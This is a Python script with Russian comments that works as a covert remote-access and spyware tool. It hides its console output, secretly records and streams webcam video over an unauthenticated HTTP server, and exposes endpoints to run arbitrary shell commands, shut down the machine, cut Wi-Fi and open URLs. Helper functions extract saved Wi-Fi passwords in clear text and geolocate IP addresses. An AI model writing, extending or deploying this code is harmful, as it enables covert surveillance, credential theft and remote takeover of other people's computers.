import cv2
import keyboard
import os
import sys
import subprocess
import socket
import requests
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

# Отключаем вывод в терминал
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# Путь для сохранения видео
output_path = r"C:\video\video.avi"
os.makedirs(os.path.dirname(output_path), exist_ok=True)

# Параметры записи видео
fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter(output_path, fourcc, 20.0, (640, 480))

# Открываем веб-камеру
cap = cv2.VideoCapture(1)

# Переменная для хранения вывода консоли
cmd_output = ""

def generate_frames():
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        out.write(frame)

        if keyboard.is_pressed('win+alt+p'):
            break

        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()

        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

class VideoStreamHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/video_feed':
            self.send_response(200)
            self.send_header('Content-Type', 'multipart/x-mixed-replace; boundary=frame')
            self.end_headers()
            for frame in generate_frames():
                self.wfile.write(frame)
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == '/shutdown':
            subprocess.call(["shutdown", "/s", "/t", "1"])
            self.send_response(204)
        elif self.path == '/open_explorer':
            subprocess.Popen("explorer.exe")
            self.send_response(204)
        elif self.path == '/execute_command':
            global cmd_output
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            command = post_data.decode('utf-8').split('=')[1]
            if command:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()
                cmd_output += f"> {command}\n{stdout}\n{stderr}\n"
            self.send_response(204)
        elif self.path == '/disconnect_wifi':
            subprocess.call(["netsh", "wlan", "disconnect"])
            self.send_response(204)
        elif self.path == '/open_url':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            url = post_data.decode('utf-8').split('=')[1]
            if url:
                subprocess.Popen(["start", url], shell=True)
            self.send_response(204)
        else:
            self.send_response(404)

def get_local_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except Exception as e:
        return f"Ошибка при получении локального IP-адреса: {e}"

def get_public_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        return response.json().get('origin')
    except Exception as e:
        return f"Ошибка при получении публичного IP-адреса: {e}"

def get_wifi_info():
    try:
        data = subprocess.check_output("netsh wlan show profiles").decode('cp866').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "Все профили пользователей" in i]
        pass_wifi = ''

        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp866').split('\n')
            for j in results:
                if "Содержимое ключа" in j:
                    pass_wifi += f"{i} -- {j.split(':')[1][1:-1]}\n"

        return pass_wifi
    except Exception as ex:
        return f'Ошибка: {ex}'

def get_info_by_ip(ip):
    try:
        response = requests.get(url=f'http://ip-api.com/json/{ip}').json()

        data = {
            '[IP]': response.get('query'),
            '[Int prov]': response.get('isp'),
            '[Org]': response.get('org'),
            '[Country]': response.get('country'),
            '[Region Name]': response.get('regionName'),
            '[City]': response.get('city'),
            '[ZIP]': response.get('zip'),
            '[Lat]': response.get('lat'),
            '[Lon]': response.get('lon'),
        }

        info = '\n'.join(f'{k} : {v}' for k, v in data.items())
        return info, None

    except requests.exceptions.ConnectionError:
        return 'Ошибка: Проверьте ваше соединение!', ''

def run_http_server():
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, VideoStreamHandler)
    httpd.serve_forever()

if __name__ == '__main__':
    # Запускаем HTTP-сервер в отдельном потоке
    http_thread = threading.Thread(target=run_http_server)
    http_thread.start()

    # Основной поток для обработки видео
    generate_frames()
